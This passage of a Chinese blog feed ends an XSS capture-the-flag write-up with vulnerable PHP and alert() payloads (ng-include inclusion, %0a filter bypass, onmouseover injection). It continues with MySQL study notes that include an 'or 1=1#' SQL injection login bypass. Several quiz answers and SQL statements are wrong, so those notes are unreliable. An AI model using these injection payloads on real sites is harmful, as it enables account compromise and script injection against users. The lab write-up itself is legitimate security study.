data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B404%E6%9C%8801%E6%97%A51418_1.png" alt></p><h1 id="level14"><a href="#level14" class="headerlink" title="level14"></a>level14</h1><p>题目地址失效</p><h1 id="level15"><a href="#level15" class="headerlink" title="level15"></a>level15</h1><pre><code>&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;src&quot;];echo &#39;&lt;body&gt;&lt;span class=&quot;ng-include:&#39;.htmlspecialchars($str).&#39;&quot;&gt;&lt;/span&gt;&lt;/body&gt;&#39;;?&gt;</code></pre><p><code>ng-include</code>指令：</p><pre><code>1、ng-include 指令用于包含外部的 HTML文件。2、包含的内容将作为指定元素的子节点。3、ng-include 属性的值可以是一个表达式，返回一个文件名。4、默认情况下，包含的文件需要包含在同一个域名下。特别值得注意的几点如下：1.ng-include,如果单纯指定地址，必须要加引号2.ng-include,加载外部html，script标签中的内容不执行3.ng-include,加载外部html中含有style标签样式可以识别</code></pre><p>既然这里可以包含html文件，那么也就可以包含之前有过xss漏洞的源文件，构造payload：</p><pre><code>?src=&#39;level1.php?name=&lt;img src=1 onerror=alert(1)&gt;&#39;</code></pre><p>name为level1中传入的参数值</p><h1 id="level16"><a href="#level16" class="headerlink" title="level16"></a>level16</h1><pre><code>&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = strtolower($_GET[&quot;keyword&quot;]);$str2=str_replace(&quot;script&quot;,&quot;&amp;nbsp;&quot;,$str);$str3=str_replace(&quot; &quot;,&quot;&amp;nbsp;&quot;,$str2);$str4=str_replace(&quot;/&quot;,&quot;&amp;nbsp;&quot;,$str3);$str5=str_replace(&quot;    &quot;,&quot;&amp;nbsp;&quot;,$str4);echo &quot;&lt;center&gt;&quot;.$str5.&quot;&lt;/center&gt;&quot;;?&gt;</code></pre><p>特殊点：插入了center标签</p><p>但是过滤了多次空格像是在给我们提示：%0a,构造payload：</p><pre><code>&lt;img%0asrc=666%0aonerror=alert(666);&gt;</code></pre><p>经过测试%09失败</p><h1 id="level17"><a href="#level17" class="headerlink" title="level17"></a>level17</h1><pre><code>&lt;?phpini_set(&quot;display_errors&quot;, 0);echo &quot;&lt;embed src=xsf01.swf?&quot;.htmlspecialchars($_GET[&quot;arg01&quot;]).&quot;=&quot;.htmlspecialchars($_GET[&quot;arg02&quot;]).&quot; width=100% heigth=100%&gt;&quot;;?&gt;</code></pre><p><a href="https://www.runoob.com/tags/att-embed-src.html" target="_blank" rel="noopener">HTML <embed> src 属性</a></p><p> 构造payload：</p><pre><code>arg01=a&amp;arg02=b onmouseover=alert(666)</code></pre><h1 id="level18"><a href="#level18" class="headerlink" title="level18"></a>level18</h1><pre><code>&lt;?phpini_set(&quot;display_errors&quot;, 0);echo &quot;&lt;embed src=xsf02.swf?&quot;.htmlspecialchars($_GET[&quot;arg01&quot;]).&quot;=&quot;.htmlspecialchars($_GET[&quot;arg02&quot;]).&quot; width=100% heigth=100%&gt;&quot;;?&gt;</code></pre><p>构造payload：</p><pre><code>arg01=a&amp;arg02=b onmouseover=alert(666)</code></pre><h1 id="level19"><a href="#level19" class="headerlink" title="level19"></a>level19</h1><p>涉及反编译，待解</p><h1 id="level20"><a href="#level20" class="headerlink" title="level20"></a>level20</h1><p>涉及反编译，待解</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xss </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MySQL学习</title>
      <link href="/2021/03/22/mysql-da-xue-xi/"/>
      <url>/2021/03/22/mysql-da-xue-xi/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=1415663223&auto=1&height=66"></iframe><h1 id="简答题考点总结："><a href="#简答题考点总结：" class="headerlink" title="简答题考点总结："></a>简答题考点总结：</h1><ul><li>数据库特点？p3</li><li>mysql优势？p11</li><li>建立索引有几种方法，索引的优点，索引的类型？</li><li>存储过程和函数具有哪一些优点？</li><li>在实际操作中，可能会造成数据丢失的有哪些方面？</li><li>如何用out table修改表名，字段名，添加字段，删除字段，修改字段顺序，修改字段类型？</li><li>为什么要应用触发器，什么是触发器，触发器有哪几种触发器有什么优点？</li><li>什么是日志文件、为什么要设立日志文件？</li><li>什么是数据库镜像、有什么用途？</li><li>事物的概念、事务的四个特性？</li></ul><h1 id="Mysql练习题答案汇总"><a href="#Mysql练习题答案汇总" class="headerlink" title="Mysql练习题答案汇总"></a>Mysql练习题答案汇总</h1><p>数据库系统的英文缩写是：<strong>DBS</strong></p><p>在客户/服务器结构中,数据库系统管理系统称为：<strong>后台</strong></p><p>表示属性取值范围的是：<strong>域</strong></p><p>可用于授予权限的SQL语句是：<strong>grant</strong></p><p>可用于收回权限的SQL语句是：<strong>revoke</strong></p><p>在SQL语言中,用于判定子查询的结果集是否为空的关键字是：<strong>exist</strong></p><p>对于存储过程说法错误的是（1.0分）</p><p>A、存储过程由SQL语句和过程式语句组成</p><p><strong>B、存储过程必须包含 RETURN语句</strong></p><p>C、存储过程可以拥有输出参数</p><p>D、使用CALL语句对存储过程调用</p><p>保护数据库以防止不合法的使用而造成数据泄露、更改或破坏是数据库的：<strong>安全性</strong></p><p>在 MYSQL中,删除触发器的语句是：<strong>drop trigger</strong></p><p>在 MYSQL中,删除触发器的语句是：<strong>drop user</strong></p><p>对于使用存储过程的好处说法错误的是(<strong>D</strong>)</p><p>A.可增强SQL语言的功能’</p><p>B.可增强SQL语言的灵活性</p><p>C.具有良好的封装性</p><p><strong>D.系统运行稳定</strong></p><p>在MySQL中,用于实现内连接的关键字是：<strong>inner join</strong></p><p>在MySQL中,用于实现左外连接的关键字是：<strong>left join</strong></p><p>关系表中的列,也称作：<strong>字段</strong></p><p>设关系R有r个属性,关系S有s个属性,其中有一个属性是相同的,经过R和S的笛卡尔积操作后,属性个数是：<strong>r+s</strong></p><p>下列关系代数操作中,要求两个运算对象其属性结构完全相同的是：<strong>并、交、差</strong></p><p>下列聚合函数中,不忽略空值的是：<strong>count(*)</strong></p><p>飞机的座位和乘客之间的联系是：<strong>1:1</strong></p><p>如果想找出关系R的属性A上为空的那些元组,则选择子句应该为：<strong>WHERE A IS NULL</strong></p><p>每个部门有多名职工,每名职工在一个部门任职,实体集部门与职工之间的联系是：<strong>一对多</strong></p><p>SQL语言中建立惟一性索引的命令是：<strong>create union index 索引名 on 基本表名(属性名)</strong></p><p>实体集学生与课程之间的联系是：<strong>多对多</strong></p><p>将查询关系S的权限授予用户WANG,并允许该用户将此权限授予其他用户。实现此<br>功能的SQL语句是：<strong>grant select to s wang with grant option</strong></p><p>长期存储在计算机内、有组织的、统一管理的相关数据的集合称为：<strong>数据库</strong><br>不能激活触发器执行的事件是：<strong>select</strong></p><p>查看触发器内容的语句是：<strong>select * from triggers;</strong></p><p>在MySQL中,使用关键字AUTO_INCREMENT设置自增属性时,要求该属性列的数据类型是：<strong>int(整数)</strong></p><p>如果DELETE语句中没有使用WHERE子句,则下列叙述中正确的是：<strong>删除表中的所有记录</strong></p><p>MySQL中,激活触发器的命令包括：<strong>INSERT、DELETE 、UPDATE</strong></p><p>使用关键字CALL可以调用的数据库对象是：<strong>储存过程</strong></p><p>在存储过程中,使用游标的一般流程是：<strong>声明打开读取关闭</strong></p><p>在MySQL中,INSERT触发器操作数据时,可以使用的临时表是：<strong>new</strong></p><p>数据模型的类型主要有：<strong>概念、逻辑、物理模型</strong></p><p>数据库系统中的数据模型有：<strong>层次、网状、关系模型</strong></p><p>MySQL中的变量可分为：<strong>系统、用户、局部变量</strong></p><p>下面哪些是常见的数据库管理系统：<strong>ACCESS、SQL Server、 Oracle、MySQL、FoxPro和Sybase等</strong></p><p>下列叙述正确的是(<strong>A</strong>)（1.0分）</p><p><strong>A、ORDER BY子句所产生的输出只是逻辑排序效果,并没有影响表的实际内容</strong></p><p>B、在ORDER BY子句后只能有一个属性</p><p>C、ORDER BY子句中必须指明是升序或降序,不能缺省</p><p>D、进行有序输出时,如果列中有空值则在升序输出时首先列出空值项,而在降序时最后<br>列出空值项</p><h1 id="MySQL学习笔记"><a href="#MySQL学习笔记" class="headerlink" title="MySQL学习笔记"></a>MySQL学习笔记</h1><h1 id="创建goods（货物）表结构"><a href="#创建goods（货物）表结构" class="headerlink" title="创建goods（货物）表结构"></a>创建goods（货物）表结构</h1><h2 id="1-创建数据库db-shop"><a href="#1-创建数据库db-shop" class="headerlink" title="1.创建数据库db_shop"></a>1.创建数据库db_shop</h2><pre><code>create database db_shop;</code></pre><h2 id="2-选择数据库"><a href="#2-选择数据库" class="headerlink" title="2.选择数据库"></a>2.选择数据库</h2><pre><code>use db_shop;</code></pre><h2 id="3-创建数据表"><a href="#3-创建数据表" class="headerlink" title="3.创建数据表"></a>3.创建数据表</h2><pre><code>create table goods(id int(11) primary key auto_increment,type varchar(30) not null,name varchar(30) unique,price decimal(7,2) unsigned,num int(11) default 0,add_time datetime);</code></pre><h2 id="4-添加表单数据"><a href="#4-添加表单数据" class="headerlink" title="4.添加表单数据"></a>4.添加表单数据</h2><pre><code>show tables;select * from goods;insert into goods(id,type,name) values(1,&#39;书籍&#39;,&#39;杨云凯的成功学&#39;);</code></pre><h2 id="5-向表中的所有列插入数据："><a href="#5-向表中的所有列插入数据：" class="headerlink" title="5.向表中的所有列插入数据："></a>5.向表中的所有列插入数据：</h2><pre><code>insert into goods values(1,&#39;slave&#39;,&#39;王国强的脑袋&#39;,1,1,&#39;2021-3-29&#39;),(2,&#39;slave&#39;,&#39;王国强的手&#39;,1,1,&#39;2021-3-29&#39;),(3,&#39;slave&#39;,&#39;王国强的脚&#39;,1,1,&#39;2021-3-29&#39;),(4,&#39;slave&#39;,&#39;王国强的眼珠子&#39;,1,1,&#39;2021-3-29&#39;);</code></pre><h2 id="6-创建新表："><a href="#6-创建新表：" class="headerlink" title="6.创建新表："></a>6.创建新表：</h2><pre><code>create table new_goods(id int(11) primary key auto_increment,type varchar(30) not null,name varchar(30) unique,price decimal(7,2) unsigned,num int(11) default 0,add_time datetime);</code></pre><h2 id="7-将goods的内容插入到new-goods中："><a href="#7-将goods的内容插入到new-goods中：" class="headerlink" title="7.将goods的内容插入到new_goods中："></a>7.将goods的内容插入到new_goods中：</h2><pre><code>insert into new_goods() select *from goods;</code></pre><h2 id="实操1-school-："><a href="#实操1-school-：" class="headerlink" title="实操1(school)："></a>实操1(school)：</h2><h3 id="1-创建数据库school并使用"><a href="#1-创建数据库school并使用" class="headerlink" title="1.创建数据库school并使用:"></a>1.创建数据库school并使用:</h3><pre><code>creat database school;use school;</code></pre><h3 id="2-创建表music："><a href="#2-创建表music：" class="headerlink" title="2.创建表music："></a>2.创建表music：</h3><p>unsigned(不能为负数)</p><pre><code>creat table music(id int(11) unsigned not null auto_increment,name varchar(20) not null,primary key(id));</code></pre><h1 id="sql注入实操语句："><a href="#sql注入实操语句：" class="headerlink" title="sql注入实操语句："></a>sql注入实操语句：</h1><pre><code>create table user(id int(11) primary key auto_increment,uname varchar(30) not null,passwd varchar(30) unique,add_time datetime);</code></pre><pre><code>insert into user(id,uname,passwd) values(1,&#39;admin&#39;,&#39;123&#39;);</code></pre><pre><code>select * from user where uname = &#39;admin&#39; or 1=1#&#39; and passwd = &#39;123&#39;;</code></pre><h1 id="MySQL-ALTER命令："><a href="#MySQL-ALTER命令：" class="headerlink" title="MySQL ALTER命令："></a>MySQL ALTER命令：</h1><p>当我们需要修改数据表名或者修改数据表字段时，就需要使用到MySQL ALTER命令。</p><p>创建菜鸟数据库并使用：</p><pre><code>creat database runoob;use runoob;</code></pre><p>创建表：</p><pre><code>create table alter_tbl(i INT,c CHAR(1));</code></pre><h2 id="删除，添加或修改表字段："><a href="#删除，添加或修改表字段：" class="headerlink" title="删除，添加或修改表字段："></a>删除，添加或修改表字段：</h2><p>如下命令使用了 ALTER 命令及 DROP 子句来删除以上创建表的 i 字段：</p><pre><code>ALTER TABLE alter_tb  DROP i;</code></pre><p>如果数据表中只剩余一个字段则无法使用DROP来删除字段。</p><p>MySQL 中使用 ADD 子句来向数据表中添加列，如下实例在表 alter_tb 中添加 i 字段，并定义数据类型:</p><pre><code>ALTER TABLE alter_tb ADD i INT;</code></pre><p>执行以上命令后，i 字段会自动添加到数据表字段的末尾。</p><p>如果你需要指定新增字段的位置，可以使用MySQL提供的关键字 FIRST (设定位第一列)， AFTER 字段名（设定位于某个字段之后）。</p><p>尝试以下 ALTER TABLE 语句, 在执行成功后，使用 SHOW COLUMNS 查看表结构的变化：</p><pre><code>ALTER TABLE alter_tb DROP i;ALTER TABLE alter_tb ADD i INT FIRST;ALTER TABLE alter_tb DROP i;ALTER TABLE alter_tb ADD i INT AFTER c;</code></pre><p>FIRST 和 AFTER 关键字可用于 ADD 与 MODIFY 子句，所以如果你想重置数据表字段的位置就需要先使用 DROP 删除字段然后使用 ADD 来添加字段并设置位置。</p><h2 id="修改字段类型及名称"><a href="#修改字段类型及名称" class="headerlink" title="修改字段类型及名称"></a>修改字段类型及名称</h2><p>如果需要修改字段类型及名称, 你可以在ALTER命令中使用 MODIFY 或 CHANGE 子句 。</p><p>例如，把字段 c 的类型从 CHAR(1) 改为 CHAR(10)，可以执行以下命令:</p><pre><code>ALTER TABLE alter_tb MODIFY c CHAR(10);</code></pre><p>使用 CHANGE 子句, 语法有很大的不同。 在 CHANGE 关键字之后，紧跟着的是你要修改的字段名，然后指定新字段名及类型。尝试如下实例：</p><pre><code>ALTER TABLE alter_tb CHANGE i j BIGINT;ALTER TABLE alter_tb CHANGE j j INT;</code></pre><h2 id="修改字段默认值："><a href="#修改字段默认值：" class="headerlink" title="修改字段默认值："></a>修改字段默认值：</h2><pre><code>ALTER TABLE alter_tb ALTER i SET DEFAULT 1000;SHOW COLUMNS FROM alter_tb;+-------+---------+------+-----+---------+-------+| Field | Type    | Null | Key | Default | Extra |+-------+---------+------+-----+---------+-------+| c     | char(1) | YES  |     | NULL    |       || i     | int(11) | YES  |     | 1000    |       |+-------+---------+------+-----+---------+-------+2 rows in set (0.00 sec)</code></pre><p>你也可以使用 ALTER 命令及 DROP子句来删除字段的默认值，如下实例：</p><pre><code>ALTER TABLE alter_tb ALTER i DROP DEFAULT;SHOW COLUMNS FROM alter_tb;+-------+---------+------+-----+---------+-------+| Field | Type    | Null | Key | Default | Extra |+-------+---------+------+-----+---------+-------+| c     | char(1) | YES  |     | NULL    |       || i     | int(11) | YES  |     | NULL    |       |+-------+---------+------+-----+---------+-------+2 rows in set (0.00 sec)Changing a Table Type:</code></pre><h2 id="修改表名："><a href="#修改表名：" class="headerlink" title="修改表名："></a><strong>修改表名：</strong></h2><p>如果需要修改数据表的名称，可以在 ALTER TABLE 语句中使用 RENAME 子句来实现。</p><p>尝试以下实例将数据表 alter_tb 重命名为 alter_tbl：</p><pre><code>ALTER TABLE alter_tb RENAME TO alter_tbl;</code></pre><h1 id="MySQL预编译："><a href="#MySQL预编译：" class="headerlink" title="MySQL预编译："></a>MySQL预编译：</h1><h2 id="1-预编译相关语法如下："><a href="#1-预编译相关语法如下：" class="headerlink" title="1.预编译相关语法如下："></a>1.预编译相关语法如下：</h2><pre><code>set用于设置变量名和值prepare用于预备一个语句，并赋予名称，以后可以引用该语句execute执行语句deallocate prepare用来释放掉预处理的语句</code></pre><h2 id="2-常用操作"><a href="#2-常用操作" class="headerlink" title="2:常用操作"></a>2:常用操作</h2><p> 1:创建预处理语句</p><p>  prepare stmt_name from ‘select * from t_copy where id&gt;?’;</p><h3 id="2-设置一个全局的变量"><a href="#2-设置一个全局的变量" class="headerlink" title="2:设置一个全局的变量"></a>2:设置一个全局的变量</h3><p>  set @ i=5;</p><h3 id="3-执行stmt-name预处理语句"><a href="#3-执行stmt-name预处理语句" class="headerlink" title="3:执行stmt_name预处理语句"></a>3:执行stmt_name预处理语句</h3><p>  execute stmt_name using @i;</p><h3 id="4-删除预处理"><a href="#4-删除预处理" class="headerlink" title="4:删除预处理"></a>4:删除预处理</h3><p>  drop prepare stmt_name </p><p>同时也可以先现设置预编译的语句：</p><pre><code>@p = &#39;user&#39;;@sql = concat(&#39;select * from&#39;,@p);prepare stmt_name from @sql;execute stmt_name;drop prepare stmt_name;</code></pre><h1 id="MySQL期中考试复习题"><a href="#MySQL期中考试复习题" class="headerlink" title="MySQL期中考试复习题"></a>MySQL期中考试复习题</h1><h2 id="第一部分"><a href="#第一部分" class="headerlink" title="第一部分"></a>第一部分</h2><h3 id="一、建立数据库"><a href="#一、建立数据库" class="headerlink" title="一、建立数据库"></a>一、建立数据库</h3><h4 id="1、请建立数据库，数据库名为studentdb1"><a href="#1、请建立数据库，数据库名为studentdb1" class="headerlink" title="1、请建立数据库，数据库名为studentdb1"></a>1、请建立数据库，数据库名为studentdb1</h4><p>Create database studentdb1;</p><h4 id="2、选择数据库"><a href="#2、选择数据库" class="headerlink" title="2、选择数据库"></a>2、选择数据库</h4><p>Use studentdb1;</p><h3 id="二、建立数据表"><a href="#二、建立数据表" class="headerlink" title="二、建立数据表"></a>二、建立数据表</h3><h4 id="1、建立student学生表。"><a href="#1、建立student学生表。" class="headerlink" title="1、建立student学生表。"></a>1、建立student学生表。</h4><table><thead><tr><th>字段名</th><th>字段类型</th><th>字段长度</th><th>约束</th></tr></thead><tbody><tr><td>Sno</td><td>varchar</td><td>20</td><td>Primary key</td></tr><tr><td>sname</td><td>varchar</td><td>10</td><td>Not null</td></tr><tr><td>sage</td><td>int</td><td></td><td>null</td></tr><tr><td>ssex</td><td>varchar</td><td>4</td><td>null</td></tr></tbody></table><pre><code>Create  table  student(Sno  varchar(20)  primary key,Sname  varchar(40)  not null,Sage  int  ,Ssex  varchar(4));</code></pre><h4 id="2、建立course课程表"><a href="#2、建立course课程表" class="headerlink" title="2、建立course课程表"></a>2、建立course课程表</h4><table><thead><tr><th>字段名</th><th>字段类型</th><th>字段长度</th><th>约束</th></tr></thead><tbody><tr><td>Cno</td><td>varchar</td><td>20</td><td>Primary key</td></tr><tr><td>Cname</td><td>varchar</td><td>10</td><td>Not null</td></tr><tr><td>Tno</td><td>varchar</td><td>20</td><td>null</td></tr></tbody></table><pre><code>Create table course(Cno varchar(20) primary key,Cname varchar(10) not null,Tno varchar(20) );</code></pre><h4 id="3、建立sc成绩表"><a href="#3、建立sc成绩表" class="headerlink" title="3、建立sc成绩表"></a>3、建立sc成绩表</h4><table><thead><tr><th>字段名</th><th>字段类型</th><th>字段长度</th><th>约束</th></tr></thead><tbody><tr><td>Sno</td><td>varchar</td><td>20</td><td>Not null</td></tr><tr><td>Cno</td><td>varchar</td><td>20</td><td>Not null</td></tr><tr><td>score</td><td>int</td><td></td><td>null</td></tr></tbody></table><pre><code>Create table sc(Sno varchar(20) not null,Cno varchar(20) not null,Score int );</code></pre><h4 id="4、建立Teacher教师表"><a href="#4、建立Teacher教师表" class="headerlink" title="4、建立Teacher教师表"></a>4、建立Teacher教师表</h4><table><thead><tr><th>字段名</th><th>字段类型</th><th>字段长度</th><th>约束</th></tr></thead><tbody><tr><td>Tno</td><td>varchar</td><td>20</td><td>Primary key</td></tr><tr><td>Tname</td><td>varchar</td><td>10</td><td>Not null</td></tr></tbody></table><pre><code>Create table teacher(Tno varchar(20) primary key,Tname varchar(10) not null);</code></pre><h3 id="三、查看数据表的结构"><a href="#三、查看数据表的结构" class="headerlink" title="三、查看数据表的结构"></a><strong>三、查看数据表的结构</strong></h3><h4 id="1、使用describe语句查看student数据表的结构数据；"><a href="#1、使用describe语句查看student数据表的结构数据；" class="headerlink" title="1、使用describe语句查看student数据表的结构数据；"></a>1、使用describe语句查看student数据表的结构数据；</h4><p>Desc student;  </p><p>Describe student;</p><h4 id="1、使用show-create-table查看course数据表的结构信息；"><a href="#1、使用show-create-table查看course数据表的结构信息；" class="headerlink" title="1、使用show create table查看course数据表的结构信息；"></a>1、使用show create table查看course数据表的结构信息；</h4><p>Show create table course \G</p><p><strong>(\G:将查询到的横向表格纵向输出，方便阅读，\g:等价于“；”)</strong></p><h3 id="四、修改数据表结构（参考课本P74-78页）"><a href="#四、修改数据表结构（参考课本P74-78页）" class="headerlink" title="四、修改数据表结构（参考课本P74-78页）"></a><strong>四、修改数据表结构（参考课本P74-78页）</strong></h3><p><strong>1、将数据表SC的名称修改为stuScore。</strong></p><p>Alter table sc <strong>rename</strong> stuscore;</p><p>改完以后查看数据表：desc stuscore;</p><p><strong>2.将数据表stuScore中的字段score的数据类型修改为smallint。</strong></p><p>考点：modify</p><p>Alter table stuScore <strong>modify(修正，更正)</strong> score smallint;</p><p><a href="https://www.runoob.com/mysql/mysql-data-types.html" target="_blank" rel="noopener">MySQL 数据类型</a></p><p>原来是int（大整数值）现在改为smallint（大整数值），后者相对于前者的范围由42亿（10位数）变为了6万（5位数）</p><p><strong>3.将数据表teacher中的字段Tname的长度修改为30.</strong>  </p><p>考点：modify</p><p>Alter table teacher <strong>modify</strong> tname varchar(30);</p><p><strong>4.在数据表teacher中最后位置添加字段Tage，数据类型为smallint，约束条件不为空。</strong></p><p>考点：add</p><p>Alter table teacher <strong>add</strong> tage smallint not null;  </p><p><strong>5.在 数据表teacher中最后位置添加字段location，数据类型为varchar，长度为50。</strong></p><p>考点：add</p><p>Alter table teacher <strong>add</strong> location varchar(50);    </p><p><strong>6.将数据表teacher中location字段的字段名，修改为loc，其数据类型为char，长度60。</strong>  </p><p>考点：change</p><p>Alter table teacher <strong>change</strong> location loc char(60); </p><p><strong>7.将数据表teacher中loc字段调整到“Tname”字段之后。</strong> </p><p>考点：after</p><p>Alter table teacher modify loc char(60) <strong>after</strong> tname;</p><p><strong>8.将数据表teacher中的loc字段删除。</strong>  </p><p>Alter table teacher <strong>drop</strong> loc;</p><p><strong>9.为数据表student中的字段ssex添加默认值约束，默认值为‘男’。</strong> </p><p>Alter table student add constraint(强制，约束) student_ssex default(‘男’) for ssex;</p><p>Alter table student add constraint student_ssex default(‘男’) for ssex;</p><p><strong>10.为数据表stuScore中的字段Sno添加主键约束。</strong></p><p>Alter table stuScore <strong>add constraint</strong> stuScore_sno <strong>primary key(sno)</strong>;</p><p><strong>11.删除数据表teacher主键约束</strong></p><p>Alter table teacher drop primary key;(由于一个表中只有一个主键，所以直接删除主键就可以)</p><p><strong>12.删除数据表student中Ssex的默认值约束</strong> </p><p>Alter table student drop constraint stuScore_sno primary key(sno);（报错）</p><p>Alter table student drop primary key;（可行）</p><p><strong>13.删除数据表teacher</strong>  </p><p>Drop table teacher;</p><h3 id="五、插入数据"><a href="#五、插入数据" class="headerlink" title="五、插入数据"></a><strong>五、插入数据</strong></h3><h4 id="1、向student数据表中插入四条数据"><a href="#1、向student数据表中插入四条数据" class="headerlink" title="1、向student数据表中插入四条数据"></a>1、向student数据表中插入四条数据</h4><table><thead><tr><th>Sno</th><th>sname</th><th>sage</th><th>ssex</th></tr></thead><tbody><tr><td>2017001</td><td>王伟</td><td>18</td><td>男</td></tr><tr><td>2017002</td><td>宋江</td><td>20</td><td>男</td></tr><tr><td>2017003</td><td>张丽</td><td>18</td><td>女</td></tr><tr><td>2017004</td><td>李春</td><td>19</td><td>女</td></tr></tbody></table><p>Insert into student(sno,sname,sage,ssex) values (‘2017001’,’ice’,18,’man’),(‘2017002’,’berg’,20,’man’),(‘2017003’,’Yang’,18,’wom’),(‘2017004’,’8rrett’,19,’wom’);</p><h4 id="2、向course数据表中插入三条数据"><a href="#2、向course数据表中插入三条数据" class="headerlink" title="2、向course数据表中插入三条数据"></a>2、向course数据表中插入三条数据</h4><table><thead><tr><th>Cno</th><th>Cname</th><th>Tno</th></tr></thead><tbody><tr><td>C001</td><td>JAVA</td><td>T01</td></tr><tr><td>C002</td><td>MYSQL</td><td>T02</td></tr><tr><td>C003</td><td>LINUX</td><td>T03</td></tr></tbody></table><p>Insert into course(cno,cname,tno) values(‘c01’,’JAVA’,’t01’),(‘c02’,’MYSQL’,’t01’),(‘c03’,’LINUX’,’t01’);</p><h3 id="六、显示数据"><a href="#六、显示数据" class="headerlink" title="六、显示数据"></a><strong>六、显示数据</strong></h3><p><strong>1、查询student数据表中所有的‘man’学生。</strong> </p><p>Select <em>  from student where ssex<em>*=</em></em>‘man’; </p><p><strong>2.查询student数据表中所有姓‘Y’的学生。</strong> </p><p> Select <em> from student where sname <em>*like</em></em> ‘Y%’;</p><p><strong>3、查询student数据表中年龄在19-20之间的学生。</strong> </p><p>Select <em> from student where sage <em>*between</em></em> 19 and 20;</p><h3 id="七、删除数据"><a href="#七、删除数据" class="headerlink" title="七、删除数据"></a><strong>七、删除数据</strong></h3><p><strong>1、删除数据表student中的Sno为2017004的学生记录</strong> </p><p>Delete from student where sno=’2017004’;</p><p><strong>2、删除数据表student中的Ssex为女的学生记录</strong>    </p><p> Delete from student where ssex=’wom’;</p><h3 id="八、增加数据"><a href="#八、增加数据" class="headerlink" title="八、增加数据"></a><strong>八、增加数据</strong></h3><p><strong>1、向数据表student中添加一条记录</strong>，（‘2017005’，‘zhang’，18，‘man’） </p><p><strong>Insert  into</strong> student values(‘2017005’,’zhang’,18,’man’);</p><p><strong>2、向数据表course中添加一条记录</strong>，（‘c004’，‘computernet’，‘T04’）</p><p> <strong>Insert into</strong> course values(‘c004’,’computernet’,’T04 ‘);  </p><h3 id="九、修改数据"><a href="#九、修改数据" class="headerlink" title="九、修改数据"></a><strong>九、修改数据</strong></h3><p>1、将student表中学生2017001的年龄改为22岁。  </p><p><strong>Update</strong> student <strong>set sage</strong>=22 where sno=’2017001’;</p><p>2、将course数据表中Cname为’LINUX’的课程名修改为’ LINUXcool’。 </p><p>Update course set cname=’ LINUXcool’  where cname=’LINUX’;</p><h2 id="第二部分"><a href="#第二部分" class="headerlink" title="第二部分"></a>第二部分</h2><p>单表查询和多表查询练习</p><p>创建数据表employee（员工表）</p><pre><code>CREATE TABLE employee(e_no    INT NOT NULL PRIMARY KEY,e_name   VARCHAR(100) NOT NULL,e_gender  CHAR(2) NOT NULL,dept_no  INT NOT NULL,e_job    VARCHAR(100) NOT NULL,e_salary  SMALLINT NOT NULL,hireDate  DATE,);</code></pre><p>向employee表中插入数据</p><pre><code>INSERT INTO employee VALUES (1001, &#39;SMITH&#39;, &#39;m&#39;,20, &#39;CLERK&#39;,800,&#39;2005-11-12&#39;),(1002, &#39;ALLEN&#39;, &#39;f&#39;,30, &#39;SALESMAN&#39;, 1600,&#39;2003-05-12&#39;),(1003, &#39;WARD&#39;, &#39;f&#39;,30, &#39;SALESMAN&#39;, 1250,&#39;2003-05-12&#39;),(1004, &#39;JONES&#39;, &#39;m&#39;,20, &#39;MANAGER&#39;, 2975,&#39;1998-05-18&#39;),(1005, &#39;MARTIN&#39;, &#39;m&#39;,30, &#39;SALESMAN&#39;, 1250,&#39;2001-06-12&#39;), (1006, &#39;BLAKE&#39;, &#39;f&#39;,30, &#39;MANAGER&#39;, 2850,&#39;1997-02-15&#39;),(1007, &#39;CLARK&#39;, &#39;m&#39;,10, &#39;MANAGER&#39;, 2450,&#39;2002-09-12&#39;),(1008, &#39;SCOTT&#39;, &#39;m&#39;,20, &#39;ANALYST&#39;, 3000,&#39;2003-05-12&#39;),(1009, &#39;KING&#39;, &#39;f&#39;,10, &#39;PRESIDENT&#39;, 5000,&#39;1995-01-01&#39;),(1010, &#39;TURNER&#39;, &#39;f&#39;,30, &#39;SALESMAN&#39;, 1500,&#39;1997-10-12&#39;),(1011, &#39;ADAMS&#39;, &#39;m&#39;,20, &#39;CLERK&#39;, 1100,&#39;1999-10-05&#39;),(1012, &#39;JAMES&#39;, &#39;m&#39;,30, &#39;CLERK&#39;, 950,&#39;2008-06-15&#39;);</code></pre><p>创建数据表dept（部门表）</p><pre><code>CREATE TABLE dept(d_no     INT NOT NULL PRIMARY KEY AUTO_INCREMENT,d_name    VARCHAR(50),d_location   VARCHAR(100));</code></pre><p>向dept表中插入数据</p><pre><code>INSERT INTO dept VALUES (10, &#39;ACCOUNTING&#39;, &#39;ShangHai&#39;),(20, &#39;RESEARCH &#39;, &#39;BeiJing &#39;),(30, &#39;SALES &#39;, &#39;ShenZhen &#39;),(40, &#39;OPERATIONS &#39;, &#39;FuJian &#39;);</code></pre><p>练习：</p><p><strong>1.在employee表中，查询所有记录的e_no、e_name和e_salary字段值。</strong></p><p> select e_no,e_name,e_salary from employee;</p><p><strong>2.在employee表中，查询dept_no等于10和20的所有记录。</strong></p><p> select * from employee where dept_no=10 or dept_no=20;</p><p><strong>3.在employee表中，查询工资范围在800~2500之间的员工信息。</strong></p><p>select * from employee where e_salary between 800 and 2500;</p><p><strong>4.在employee表中，查询部门编号为20的部门中的员工信息。</strong></p><p>select * from employee where dept_no=20;</p><p><strong>5.在employee表中，查询每个部门最高工资的员工信息。</strong></p><p>第一步:每个部门最高工资<br>SELECT MAX(e_salary) AS salary1 FROM employee GROUP BY dept_no;<br>第二步:</p><p>SELECT * FROM employee WHERE e_salary IN( SELECT MAX(e_salary) AS salary1 FROM employee GROUP BY dept_no );</p><p><strong>6.查询员工BLAKE所在部门和部门所在地。</strong></p><p>分析: 查询结果: d_name d_location(在表dept中)<br>条件: e_name = ‘李强’<br>内连接:</p><p>select d_name,d_location,e_name from emloyee inner join dept on dept_no = d_no where e_name = 